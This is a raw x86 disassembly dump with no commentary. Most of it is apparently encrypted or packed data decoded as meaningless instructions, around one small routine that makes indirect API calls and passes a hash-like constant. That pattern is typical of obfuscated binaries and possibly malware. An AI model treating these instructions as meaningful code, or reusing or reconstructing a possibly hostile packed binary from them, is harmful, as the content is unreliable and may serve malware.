  422cda:	and    ebx,DWORD PTR [edi+0x13]
  422cdd:	pop    ds
  422cde:	mov    cl,0x67
  422ce0:	inc    esi
  422ce1:	or     BYTE PTR [ebp+0x4b],0xc6
  422ce5:	mov    ch,0xa
  422ce7:	xchg   edi,eax
  422ce8:	cs retf 0x5a21
  422cec:	jo     0x422ca9
  422cee:	xchg   ebx,eax
  422cef:	pmulhw mm1,mm0
  422cf2:	mov    ah,BYTE PTR [ebp-0x4]
  422cf5:	ficom  WORD PTR [esi-0x26]
  422cf8:	loope  0x422d2a
  422cfa:	mov    eax,0x1f0d79c9
  422cff:	xor    DWORD PTR [edi-0x1e],esp
  422d02:	sub    cl,bl
  422d04:	mov    bl,0xb9
  422d06:	sub    BYTE PTR [ebx],dl
  422d08:	inc    esp
  422d09:	cld    
  422d0a:	jno    0x422cba
  422d0c:	nop
  422d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d0e:	add    dh,dh
  422d10:	jo     0x422d7e
  422d12:	(bad)  
  422d13:	mov    ah,0x40
  422d15:	pop    esi
  422d16:	mov    edx,0xf60bdd2d
  422d1b:	pop    ecx
  422d1c:	pop    ecx
  422d1d:	imul   ebp,DWORD PTR [esi],0x30428e68
  422d23:	pop    ecx
  422d24:	in     al,0x59
  422d26:	xor    al,0x1e
  422d28:	pop    ebp
  422d29:	pop    ds
  422d2a:	data16 or BYTE PTR [ecx],ah
  422d2d:	push   esi
  422d2e:	sahf   
  422d2f:	repz mov ds:0xc33690ca,al
  422d35:	sbb    eax,0xd9ae0ae7
  422d3a:	jg     0x422d99
  422d3c:	add    BYTE PTR [edi-0xbc69bd8],al
  422d42:	repnz lds edx,FWORD PTR [ecx+0x3235a373]
  422d49:	ret    0x9eed
  422d4c:	mov    ds:0xa7f23fbf,eax
  422d51:	hlt    
  422d52:	rep ins DWORD PTR es:[edi],dx
  422d54:	bound  edx,QWORD PTR [ebp+0x6bfa53aa]
  422d5a:	sub    ah,bh
  422d5c:	(bad)
  422d5f:	xor    bl,BYTE PTR [esi]
  422d61:	pusha  
  422d62:	lods   al,BYTE PTR ds:[esi]
  422d63:	(bad)  
  422d64:	mov    dh,BYTE PTR [eax+0x79]
  422d67:	cs xor al,0xed
  422d6a:	xchg   ebp,eax
  422d6b:	and    BYTE PTR [edi],ah
  422d6d:	xchg   BYTE PTR [ecx-0xb4a7519],bl
  422d73:	or     DWORD PTR [ecx-0x78],esi
  422d76:	loop   0x422d43
  422d78:	jg     0x422dc3
  422d7a:	ins    BYTE PTR es:[edi],dx
  422d7b:	clc    
  422d7c:	retf   
  422d7d:	jecxz  0x422dc1
  422d7f:	inc    edx
  422d80:	sahf   
  422d81:	iret   
  422d82:	mov    dh,0xa4
  422d84:	outs   dx,DWORD PTR ds:[esi]
  422d85:	pop    ds
  422d86:	inc    edx
  422d87:	fist   DWORD PTR [esp+ecx*2+0x6e89158a]
  422d8e:	inc    ebp
  422d8f:	sub    ebp,DWORD PTR [eax-0x71f0487a]
  422d95:	les    ecx,FWORD PTR [esi+esi*4+0x60723ace]
  422d9c:	stc    
  422d9d:	xchg   ecx,eax
  422d9e:	jb     0x422daf
  422da0:	mov    cl,0xb
  422da2:	and    al,0x48
  422da4:	xchg   cl,dl
  422da6:	mov    dh,0x3e
  422da8:	and    eax,0x3b7e26cd
  422dad:	or     eax,0x62a23554
  422db2:	and    ebp,DWORD PTR [eax-0x73]
  422db5:	inc    edi
  422db6:	inc    edx
  422db7:	or     DWORD PTR [eax-0x3888da9d],edi
  422dbd:	call   0x41:0x308048bc
  422dc4:	sbb    ch,bl
  422dc6:	es push cs
  422dc8:	daa    
  422dc9:	call   0x724336bc
  422dce:	inc    edi
  422dcf:	nop
  422dd0:	mov    BYTE PTR [ebx],bl
  422dd2:	hlt    
  422dd3:	mov    dl,BYTE PTR [edi*1-0x3e589656]
  422dda:	nop
  422ddb:	shl    ch,cl
  422ddd:	add    edx,esp
  422ddf:	idiv   edx
  422de1:	cmp    ax,0x99fc
  422de5:	xlat   BYTE PTR ds:[ebx]
  422de6:	stc    
  422de7:	aad    0x9e
  422de9:	mov    dh,0x6f
  422deb:	mov    bh,0xa7
  422ded:	fisub  WORD PTR [ecx]
  422def:	scas   al,BYTE PTR es:[edi]
  422df0:	repz ror BYTE PTR ds:0xebb2e43,0xc6
  422df8:	sbb    BYTE PTR ds:0xef876922,ah
  422dfe:	inc    eax
  422dff:	imul   eax,DWORD PTR [ecx],0xffffffde
  422e02:	mov    cl,0xbe
  422e04:	mov    dh,0x93
  422e06:	dec    edi
  422e07:	cmp    ah,BYTE PTR [ecx-0x614828ea]
  422e0d:	(bad)  
  422e0e:	mov    dh,0x2d
  422e10:	ja     0x422db0
  422e12:	cmp    BYTE PTR [esi],ah
  422e14:	cmp    bh,BYTE PTR [edi-0x42eb75fe]
  422e1a:	shl    BYTE PTR ds:[edx-0x76],0x2a
  422e1f:	xor    dl,BYTE PTR [edx+0x5a]
  422e22:	mov    ds:0x814cd74b,al
  422e27:	adc    ch,BYTE PTR [edi-0x201ebf19]
  422e2d:	mov    bh,0x8a
  422e2f:	jl     0x422e82
  422e31:	cmovbe ecx,DWORD PTR [eax+0x39]
  422e35:	mov    dh,bl
  422e37:	and    eax,DWORD PTR [ebx-0x56]
  422e3a:	mov    DWORD PTR [edx+eiz*2-0x5d],edx
  422e3e:	in     al,dx
  422e3f:	and    DWORD PTR [ebx+0xc40fb8c],ebx
  422e45:	push   ebp
  422e46:	jecxz  0x422e15
  422e48:	cli    
  422e49:	mov    cs,WORD PTR [esp+edx*1-0x3b]
  422e4d:	std    
  422e4e:	enter  0xe228,0xdd
  422e52:	fnstcw WORD PTR [ebx-0xeb9a76c]
  422e58:	sbb    DWORD PTR [ebp+0x6c],ebx
  422e5b:	sti    
  422e5c:	cmc    
  422e5d:	xchg   ah,cl
  422e5f:	lods   al,BYTE PTR ds:[esi]
  422e60:	dec    ecx
  422e61:	sbb    ch,al
  422e63:	dec    eax
  422e64:	adc    bh,BYTE PTR fs:[ebp+0x72]
  422e68:	xchg   edx,eax
  422e69:	xor    BYTE PTR [esi-0x80],al
  422e6c:	repnz or al,0x2a
  422e6f:	lods   al,BYTE PTR ds:[esi]
  422e70:	lds    esp,FWORD PTR [ecx+0x630a58b2]
  422e76:	cmp    BYTE PTR [ecx+0x34],0x36
  422e7a:	ficom  DWORD PTR [ebx]
  422e7c:	mov    ds:0x2f0c12bc,al
  422e81:	sbb    BYTE PTR [ebx-0x6b],cl
  422e84:	js     0x422e92
  422e86:	std    
  422e87:	push   ebp
  422e88:	mov    al,0x4b
  422e8a:	scas   al,BYTE PTR es:[edi]
  422e8b:	std    
  422e8c:	and    DWORD PTR [eax+0x1e3643cd],esi
  422e92:	out    dx,eax
  422e93:	sub    eax,0xf8cd23d2
  422e98:	jge    0x422ec7
  422e9a:	add    DWORD PTR [ecx+0x55],ebp
  422e9d:	mov    eax,ds:0x78f8dfa3
  422ea2:	fisubr WORD PTR [edi-0xa5937c6]
  422ea8:	outs   dx,DWORD PTR ds:[esi]
  422ea9:	test   eax,0xa82bdba2
  422eae:	sbb    DWORD PTR [esi],0x9c345ae3
  422eb4:	in     al,0x60
  422eb6:	call   0xd7404d70
  422ebb:	stos   DWORD PTR es:[edi],eax
  422ebc:	xor    ah,BYTE PTR [esi]
  422ebe:	inc    ecx
  422ebf:	rcl    si,1
  422ec2:	inc    eax
  422ec3:	idiv   DWORD PTR [ecx-0x22e9609c]
  422ec9:	ror    BYTE PTR [edx+0x5f],cl
  422ecc:	pop    ebp
  422ecd:	jo     0x422f08
  422ecf:	jne    0x422f26
  422ed1:	xor    al,0xeb
  422ed3:	pop    esp
  422ed4:	lods   eax,DWORD PTR ds:[esi]
  422ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed6:	mov    al,ds:0xceafcc45
  422edb:	(bad)  
  422edf:	sub    ch,BYTE PTR [edi]
  422ee1:	clc    
  422ee2:	push   edx
  422ee3:	call   0xd95ea605
  422ee8:	inc    esi
  422ee9:	or     DWORD PTR [edi-0x57b76f64],esi
  422eef:	ds push ds
  422ef1:	mov    bl,0x31
  422ef3:	sbb    al,0x6d
  422ef5:	inc    edi
  422ef6:	les    eax,FWORD PTR [ebp-0xc]
  422ef9:	fs nop
  422efb:	mov    al,ds:0x8564e3bb
  422f00:	xchg   ebp,eax
  422f01:	adc    cl,BYTE PTR [ebp-0x7c]
  422f04:	xchg   DWORD PTR [eax+0x66],esi
  422f07:	in     eax,0x61
  422f09:	scas   eax,DWORD PTR es:[edi]
  422f0a:	shl    esp,0xdc
  422f0d:	sbb    DWORD PTR [esp+eiz*8],0xd4a894bc
  422f14:	fld    DWORD PTR ds:0x5661177a
  422f1a:	call   0x0:0x1b8e35e
  422f21:	add    BYTE PTR [ebx-0x333ca21b],cl
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0xd150f86e
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	(bad)  
  422fc3:	frstor [edi-0x2c905d08]
  422fc9:	mov    dh,0xdc
  422fcb:	adc    eax,0x9a70f78b
  422fd0:	outs   dx,DWORD PTR ds:[esi]
  422fd1:	std    
  422fd2:	push   0xb6d36c1a
  422fd7:	fcom   QWORD PTR [ecx]
  422fd9:	mov    esi,edi
  422fdb:	xor    BYTE PTR [ebp-0x70],ah
  422fde:	std    
  422fdf:	push   0xb6d36ca2
  422fe4:	fcom   QWORD PTR [ecx]
  422fe6:	mov    esi,edi
  422fe8:	jo     0x42304f
  422fea:	nop
  422feb:	std    
  422fec:	push   0xb6d36ca2
  422ff1:	fcom   QWORD PTR [ecx]
  422ff3:	mov    esi,edi
  422ff5:	jo     0x42305c
  422ff7:	nop
  422ff8:	std    
  422ff9:	push   0xb6d36ca2
  422ffe:	fsub   st(1),st
  423000:	mov    esi,edi
  423002:	jo     0x42306f
  423004:	pop    DWORD PTR [edi+0x66]
  423007:	mov    ds:0xfd7bdad8,al
  42300c:	test   eax,0x44bdbb8a
  423011:	les    edx,FWORD PTR [ebp-0x5cb32eff]
  423017:	les    esi,FWORD PTR [ebx+0x1d96f976]
  42301d:	inc    ebp
  42301e:	repz pushf 
  423020:	push   es
  423021:	int3   
  423022:	add    esp,DWORD PTR [edi-0x548b416a]
  423028:	test   DWORD PTR ds:0x694b00b,eax
  42302e:	sub    BYTE PTR [eax],0x9c
  423031:	in     eax,0xfc
  423033:	jl     0x423019
  423035:	xchg   ebx,eax
  423036:	adc    eax,0x62f09d4b
  42303b:	xchg   BYTE PTR [ebx+edx*8-0x4a],ch
  42303f:	fcom   QWORD PTR [ecx]
  423041:	mov    esi,edi
  423043:	ja     0x423041
  423045:	ins    BYTE PTR es:[edi],dx
  423046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423047:	sub    ebx,DWORD PTR [edx-0x2]
  42304a:	fprem1 
  42304c:	and    al,0x83
  42304e:	xor    DWORD PTR [eax+ecx*4+0xda59af7],0x4e8c66ae
  423059:	dec    esi
  42305a:	sbb    edx,ebx
  42305c:	xchg   edx,eax
  42305d:	dec    eax
  42305e:	outs   dx,DWORD PTR ds:[esi]
  42305f:	push   edx
  423060:	add    eax,0xb634a8fa
  423065:	(bad)  
  423066:	(bad)  
  423067:	jns    0x4230dc
  423069:	gs jp  0x4230b5
  42306c:	push   ds
  42306d:	les    esp,FWORD PTR [edx-0x1c]
  423070:	xchg   esp,eax
  423071:	inc    ecx
  423072:	mov    esp,0xfd9a9196
  423077:	cmp    bl,BYTE PTR [ebp+0x2222f702]
  42307d:	ins    DWORD PTR es:[edi],dx
  42307e:	fldz   
  423080:	and    al,0x83
  423082:	xor    DWORD PTR [eax+ecx*4-0x6e2a650a],0x6e6c6630
  42308d:	pop    esp
  42308e:	sbb    eax,esi
  423090:	psrad  mm5,QWORD PTR [edi-0x38]
  423094:	cwde   
  423095:	push   ebp
  423096:	test   al,0x64
  423098:	sub    esp,DWORD PTR [esi+edx*8]
  42309b:	dec    ecx
  42309c:	out    dx,al
  42309d:	(bad)  
  42309e:	jp     0x4230c7
  4230a0:	push   0x9fa626f
  4230a5:	fdivr  QWORD PTR [esi+ebx*4+0x22fd19e9]
  4230ac:	or     al,0xf3
  4230ae:	xchg   ebp,eax
  4230af:	sub    ebx,DWORD PTR [edx-0x2]
  4230b2:	fnstenv [esi-0x874ee24]
  4230b8:	jo     0x42311f
  4230ba:	nop
  4230bb:	lods   eax,DWORD PTR ds:[esi]
  4230bc:	sub    eax,0xb79f6ca2
  4230c1:	ficom  WORD PTR [ecx]
  4230c3:	addr16 adc al,0x2f
  4230c6:	sub    dl,BYTE PTR [eax+0x6ca268fd]
  4230cc:	shl    DWORD PTR [esi-0xb740e24],cl
  4230d2:	jno    0x423142
  4230d4:	xchg   ecx,eax
  4230d5:	imul   DWORD PTR [eax-0x5e]
  4230d8:	adc    bh,0xb6
  4230db:	fcom   QWORD PTR ds:0x6570f78d
  4230e1:	nop
  4230e2:	std    
  4230e3:	imul   ebx,DWORD PTR [edi],0xccb6d36c
  4230e9:	adc    DWORD PTR [ebx-0x6f9f8f09],ecx
  4230ef:	std    
  4230f0:	push   0xa6d36ce3
  4230f5:	fcom   QWORD PTR [ecx]
  4230f7:	mov    esi,ebp
  4230f9:	jo     0x423160
  4230fb:	xchg   ebp,eax
  4230fc:	std    
  4230fd:	imul   esp,DWORD PTR [edx-0x23492c94],0x70f68b14
  423107:	gs nop
  423109:	std    
  42310a:	push   0xb6d8eca2
  42310f:	fcom   QWORD PTR ds:0x54cdf78b
  423115:	xchg   ebp,eax
  423116:	std    
  423117:	push   0xffffffa2
  423119:	ins    BYTE PTR es:[edi],dx
  42311a:	push   ebx
  42311b:	mov    dh,0xdc
  42311d:	add    DWORD PTR [ebx-0x6f9a9f09],ecx
  423123:	std    
  423124:	push   0xa6d36cb2
  423129:	fcom   QWORD PTR [ecx]
  42312b:	mov    esi,edi
  42312d:	jo     0x423194
  42312f:	cmp    ch,0x68
  423132:	mov    ds:0xdcb6d36c,al
  423137:	adc    DWORD PTR [ebx-0x11e8f09],ecx
  42313d:	imul   BYTE PTR [eax-0x35]
  423140:	outs   dx,DWORD PTR ds:[esi]
  423141:	shl    DWORD PTR [esi-0x87fde24],cl
  423147:	mov    edi,0x68fd9058
  42314c:	mov    ds:0xdcb6d36c,al
  423151:	adc    DWORD PTR [ebx-0x6f9a8f09],ecx
  423157:	std    
  423158:	push   0xb6d36ca2
  42315d:	fcom   QWORD PTR [ecx]
  42315f:	mov    esi,edi
  423161:	jo     0x4231c8
  423163:	nop
  423164:	std    
  423165:	push   0xb6d36ca2
  42316a:	fcom   QWORD PTR [ecx]
  42316c:	mov    esi,edi
  42316e:	jo     0x4231d5
  423170:	nop
  423171:	std    
  423172:	push   0xb6d36ca2
  423177:	fcom   QWORD PTR [ecx]
  423179:	mov    esi,edi
  42317b:	jo     0x4231e2
  42317d:	nop
  42317e:	std    
  42317f:	push   0xb6d36ca2
  423184:	fcom   QWORD PTR [ecx]
  423186:	mov    esi,edi
  423188:	jo     0x4231ef
  42318a:	nop
  42318b:	std    
  42318c:	push   0xb6d36ca2
  423191:	fcom   QWORD PTR [ecx]
  423193:	mov    esi,edi
  423195:	jo     0x4231fc
  423197:	nop
  423198:	std    
  423199:	push   0xb6d36ca2
  42319e:	fcom   QWORD PTR [ecx]
  4231a0:	mov    esi,edi
  4231a2:	jo     0x423209
  4231a4:	nop
  4231a5:	std    
  4231a6:	push   0xb6d36ca2
  4231ab:	fcom   QWORD PTR [ecx]
  4231ad:	mov    esi,edi
  4231af:	jo     0x423216
  4231b1:	nop
  4231b2:	std    
  4231b3:	inc    esi
  4231b4:	(bad)  
  4231b5:	or     DWORD PTR [ebx-0x74ee233e],ebp
  4231bb:	not    DWORD PTR [eax+0x6e]
  4231be:	nop
  4231bf:	std    
  4231c0:	js     0x423164
  4231c2:	ins    BYTE PTR es:[edi],dx
  4231c3:	ror    DWORD PTR [eax+ebx*8+0x70f38b11],cl
  4231ca:	sar    BYTE PTR gs:[eax-0x63c76fd5],0xb6
  4231d2:	fcom   QWORD PTR [ecx]
  4231d4:	mov    esi,edi
  4231d6:	jo     0x42321d
  4231d8:	nop
  4231d9:	std    
  4231da:	mov    BYTE PTR [esi+ebx*1+0x11bfc4a0],cl
  4231e1:	mov    esi,edi
  4231e3:	jo     0x42321a
  4231e5:	nop
  4231e6:	std    
  4231e7:	push   0xb6d36792
  4231ec:	mov    WORD PTR [ecx],ss
  4231ee:	mov    esi,edi
  4231f0:	dec    esi
  4231f1:	popa   
  4231f2:	nop
  4231f3:	std    
  4231f4:	push   0xb6d36ca2
  4231f9:	fcom   QWORD PTR [ecx]
  4231fb:	mov    esi,edi
  4231fd:	jo     0x423264
  4231ff:	mov    al,0xfd
  423201:	push   0xb6d36c42
  423206:	fcom   QWORD PTR [ecx]
  423208:	mov    esi,edi
  42320a:	jo     0x423271
  42320c:	nop
  42320d:	std    
  42320e:	push   0xb6d36ca2
  423213:	fcom   QWORD PTR [ecx]
  423215:	mov    esi,edi
  423217:	jo     0x42327e
  423219:	nop
  42321a:	std    
  42321b:	push   0xb6d36ca2
  423220:	fcom   QWORD PTR [ecx]
  423222:	mov    esi,edi
  423224:	jo     0x42328b
  423226:	nop
  423227:	std    
  423228:	push   0xb6d36ca2
  42322d:	fcom   QWORD PTR [ecx]
  42322f:	mov    esi,edi
  423231:	jo     0x423298
  423233:	nop
  423234:	std    
  423235:	push   0xb6d36ca2
  42323a:	fcom   QWORD PTR [ecx]
  42323c:	mov    esi,edi
  42323e:	jo     0x4232a5
  423240:	nop
  423241:	std    
  423242:	push   0xb6d36ca2
  423247:	fcom   QWORD PTR [ecx]
  423249:	mov    esi,edi
  42324b:	jo     0x4232b2
  42324d:	nop
  42324e:	std    
  42324f:	push   0xb6d36ca2
  423254:	fcom   QWORD PTR [ecx]
  423256:	mov    esi,edi
  423258:	jo     0x4232bf
  42325a:	nop
  42325b:	std    
  42325c:	push   0xb6d36ca2
  423261:	fcom   QWORD PTR [ecx]
  423263:	mov    esi,edi
  423265:	jo     0x4232cc
  423267:	nop
  423268:	std    
  423269:	push   0xb6d36ca2
  42326e:	fcom   QWORD PTR [ecx]
  423270:	mov    esi,edi
  423272:	jo     0x4232d9
  423274:	nop
  423275:	std    
  423276:	push   0xb6d36ca2
  42327b:	fcom   QWORD PTR [ecx]
  42327d:	mov    esi,edi
  42327f:	jo     0x4232e6
  423281:	nop
  423282:	std    
  423283:	push   0xb6d36ca2
  423288:	fcom   QWORD PTR [ecx]
  42328a:	mov    esi,edi
  42328c:	jo     0x4232f3
  42328e:	nop
  42328f:	std    
  423290:	push   0xb6d36ca2
  423295:	fcom   QWORD PTR [ecx]
  423297:	mov    esi,edi
  423299:	jo     0x423300
  42329b:	nop
  42329c:	std    
  42329d:	push   0xb6d36ca2
  4232a2:	fcom   QWORD PTR [ecx]
  4232a4:	mov    esi,edi
  4232a6:	jo     0x42330d
  4232a8:	nop
  4232a9:	std    
  4232aa:	push   0xb6d36ca2
  4232af:	fcom   QWORD PTR [ecx]
  4232b1:	mov    esi,edi
  4232b3:	jo     0x42331a
  4232b5:	nop
  4232b6:	std    
  4232b7:	push   0xb6d36ca2
  4232bc:	fcom   QWORD PTR [ecx]
  4232be:	mov    esi,edi
  4232c0:	jo     0x423327
  4232c2:	nop
  4232c3:	std    
  4232c4:	push   0xb6d36ca2
  4232c9:	fcom   QWORD PTR [ecx]
  4232cb:	mov    esi,edi
  4232cd:	jo     0x423334
  4232cf:	nop
  4232d0:	std    
  4232d1:	push   0xb6d36ca2
  4232d6:	fcom   QWORD PTR [ecx]
  4232d8:	mov    esi,edi
  4232da:	jo     0x423341
  4232dc:	nop
  4232dd:	std    
  4232de:	push   0xb6d36ca2
  4232e3:	fcom   QWORD PTR [ecx]
  4232e5:	mov    esi,edi
  4232e7:	jo     0x42334e
  4232e9:	nop
  4232ea:	std    
  4232eb:	push   0xb6d36ca2
  4232f0:	fcom   QWORD PTR [ecx]
  4232f2:	mov    esi,edi
  4232f4:	jo     0x42335b
  4232f6:	nop
  4232f7:	std    
  4232f8:	push   0xb6d36ca2
  4232fd:	fcom   QWORD PTR [ecx]
  4232ff:	mov    esi,edi
  423301:	jo     0x423368
  423303:	nop
  423304:	std    
  423305:	push   0xb6d36ca2
  42330a:	fcom   QWORD PTR [ecx]
  42330c:	mov    esi,edi
  42330e:	jo     0x423375
  423310:	nop
  423311:	std    
  423312:	push   0xb6d36ca2
  423317:	fcom   QWORD PTR [ecx]
  423319:	mov    esi,edi
  42331b:	jo     0x423382
  42331d:	nop
  42331e:	std    
  42331f:	push   0xb6d36ca2
  423324:	fcom   QWORD PTR [ecx]
  423326:	mov    esi,edi
  423328:	jo     0x42338f
  42332a:	nop
  42332b:	std    
  42332c:	push   0xb6d36ca2
  423331:	fcom   QWORD PTR [ecx]
  423333:	mov    esi,edi
  423335:	jo     0x42339c
  423337:	nop
  423338:	std    
  423339:	push   0xb6d36ca2
  42333e:	fcom   QWORD PTR [ecx]
  423340:	mov    esi,edi
  423342:	jo     0x4233a9
  423344:	nop
  423345:	std    
  423346:	push   0xb6d36ca2
  42334b:	fcom   QWORD PTR [ecx]
  42334d:	mov    esi,edi
  42334f:	jo     0x4233b6
  423351:	nop
  423352:	std    
  423353:	push   0xb6d36ca2
  423358:	fcom   QWORD PTR [ecx]
  42335a:	mov    esi,edi
  42335c:	jo     0x4233c3
  42335e:	nop
  42335f:	std    
  423360:	push   0xb6d36ca2
  423365:	fcom   QWORD PTR [ecx]
  423367:	mov    esi,edi
  423369:	jo     0x4233d0
  42336b:	nop
  42336c:	std    
  42336d:	push   0xb6d36ca2
  423372:	fcom   QWORD PTR [ecx]
  423374:	mov    esi,edi
  423376:	jo     0x4233dd
  423378:	nop
  423379:	std    
  42337a:	push   0xb6d36ca2
  42337f:	fcom   QWORD PTR [ecx]
  423381:	mov    esi,edi
  423383:	jo     0x4233ea
  423385:	nop
  423386:	std    
  423387:	push   0xb6d36ca2
  42338c:	fcom   QWORD PTR [ecx]
  42338e:	mov    esi,edi
  423390:	jo     0x4233f7
  423392:	nop
  423393:	std    
  423394:	push   0xb6d36ca2
  423399:	fcom   QWORD PTR [ecx]
  42339b:	mov    esi,edi
  42339d:	jo     0x423404
  42339f:	nop
  4233a0:	std    
  4233a1:	push   0xb6d36ca2
  4233a6:	fcom   QWORD PTR [ecx]
  4233a8:	mov    esi,edi
  4233aa:	jo     0x423411
  4233ac:	nop
  4233ad:	std    
  4233ae:	push   0xb6d36ca2
  4233b3:	fcom   QWORD PTR [ecx]
  4233b5:	mov    esi,edi
  4233b7:	jo     0x42341e
  4233b9:	nop
  4233ba:	std    
  4233bb:	push   0xb6d36ca2
  4233c0:	fcom   QWORD PTR [ecx]
  4233c2:	mov    esi,DWORD PTR [eax-0x2d6f9062]
  4233c8:	push   0xb6d37ca2
  4233cd:	div    BYTE PTR [ebx-0x65e979af]
  4233d3:	mov    ebp,0x81f2ef63
  4233d8:	in     eax,0x5e
  4233da:	iret   
  4233db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233dc:	push   ds
  4233dd:	xchg   ecx,eax
  4233de:	add    ecx,esp
  4233e0:	retf   0xd9ee
  4233e3:	adc    eax,0x5652be7a
  4233e8:	nop
  4233e9:	dec    ebp
  4233ea:	fst    DWORD PTR [edx]
  4233ec:	cmc    
  4233ed:	scas   eax,DWORD PTR es:[edi]
  4233ee:	les    ebx,FWORD PTR [ebx-0x13]
  4233f1:	ffree  st(4)
  4233f3:	xchg   esp,eax
  4233f4:	fdiv   QWORD PTR [esi]
  4233f6:	sub    al,0x7f
  4233f8:	and    eax,0x5a54fd34
  4233fd:	lahf   
  4233fe:	mov    cl,0xc7
  423400:	pop    es
  423401:	mov    esp,0x61d1d001
  423406:	mov    bh,cl
  423408:	pop    esp
  423409:	add    al,0x45
  42340b:	(bad)  
  42340c:	push   DWORD PTR [ecx+0x51]
  42340f:	inc    ebp
  423410:	jne    0x4233d3
  423412:	add    BYTE PTR [eax+0x6bc8ff09],ch
  423418:	push   0xde3cf44
  42341d:	(bad)  
  42341e:	jmp    0xe5b0:0x6647cbc1
  423425:	es (bad) 
  423428:	sar    DWORD PTR [ebp+0x31],1
  42342b:	jge    0x4234aa
  42342d:	sub    eax,0x9f9f1b6e
  423432:	data16 mov dh,0xe0
  423435:	push   0xffffffd2
  423437:	adc    eax,0xdbb31037
  42343c:	mov    esi,0x385408c
  423441:	std    
  423442:	pop    edi
  423443:	leave  
  423444:	mov    al,ds:0x1b8e7457
  423449:	arpl   WORD PTR [eax+eax*2],bp
  42344c:	mov    ebx,0x3cdb95a1
  423451:	pop    eax
  423452:	daa    
  423453:	push   ecx
  423454:	add    dl,cl
  423456:	mov    ch,0x56
  423458:	repz out dx,eax
  42345a:	pop    ds
  42345b:	cmc    
  42345c:	or     dl,bh
  42345e:	mov    DWORD PTR [edi],ebx
  423460:	stos   BYTE PTR es:[edi],al
  423461:	scas   eax,DWORD PTR es:[edi]
  423462:	push   edx
  423463:	lods   eax,DWORD PTR ds:[esi]
  423464:	inc    ebp
  423465:	test   BYTE PTR [edx],ah
  423467:	lea    esp,gs:[ecx-0xab7b70b]
  42346e:	xor    eax,0x895a9e0e
  423473:	frstor [ecx+ebx*2]
  423476:	and    eax,ebp
  423478:	ins    BYTE PTR es:[edi],dx
  423479:	add    al,0xfe
  42347b:	scas   al,BYTE PTR es:[edi]
  42347c:	retf   0x4595
  42347f:	enter  0x2968,0x38
  423483:	fwait
  423484:	xchg   edi,eax
  423485:	adc    ecx,ebp
  423487:	out    dx,al
  423488:	xchg   ebx,eax
  423489:	cdq    
  42348a:	jnp    0x42344d
  42348c:	stos   DWORD PTR es:[edi],eax
  42348d:	mov    ecx,0xc17b151d
  423492:	pop    edi
  423493:	jmp    0x258c7c6d
  423498:	mov    bl,0x9e
  42349a:	pop    eax
  42349b:	loope  0x4234f7
  42349d:	mov    edi,0x92e6e4a1
  4234a2:	js     0x42348f
  4234a4:	test   eax,0xfefdf0bc
  4234a9:	es in  eax,0x43
  4234ac:	sbb    al,0x73
  4234ae:	mov    ebx,0x2f2636b6
  4234b3:	mov    DWORD PTR [edi],esi
  4234b5:	inc    eax
  4234b6:	jb     0x423526
  4234b8:	jecxz  0x4234dd
  4234ba:	inc    ebp
  4234bb:	stos   DWORD PTR es:[edi],eax
  4234bc:	fst    DWORD PTR [ebx-0x280ef45a]
  4234c2:	aad    0x37
  4234c4:	xchg   edx,eax
  4234c5:	mov    ss,WORD PTR [edx]
  4234c7:	xchg   esp,eax
  4234c8:	outs   dx,BYTE PTR ds:[esi]
  4234c9:	sbb    BYTE PTR [ebx-0x5cf6bc8e],dl
  4234cf:	xchg   esi,eax
  4234d0:	ins    BYTE PTR es:[edi],dx
  4234d1:	out    dx,al
  4234d2:	ja     0x4234a1
  4234d4:	mov    eax,0xfb074ed7
  4234d9:	sahf   
  4234da:	and    edi,DWORD PTR [ebx-0x7fb263b3]
  4234e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234e1:	frstor [eax]
  4234e3:	and    BYTE PTR [ebx-0x4a789d],ch
  4234e9:	cmp    eax,0x89d161a5
  4234ee:	or     eax,DWORD PTR [esi-0x75d10b08]
  4234f4:	push   ebx
  4234f5:	or     dl,cl
  4234f7:	rdtsc  
  4234f9:	call   0x5ccadacc
  4234fe:	jne    0x4234f7
  423500:	xchg   edi,eax
  423501:	mov    ds,WORD PTR [edx]
  423503:	jecxz  0x4234c8
  423505:	lock rol BYTE PTR ss:[edx],cl
  423509:	xchg   BYTE PTR [esi-0xfd705ba],ah
  42350f:	lds    edi,FWORD PTR [ebx-0x48e22dba]
  423515:	loop   0x42354c
  423517:	enter  0x397f,0xfd
  42351b:	je     0x423544
  42351d:	and    BYTE PTR [ebx-0x5e],cl
  423520:	mov    bh,0x7a
  423522:	dec    ecx
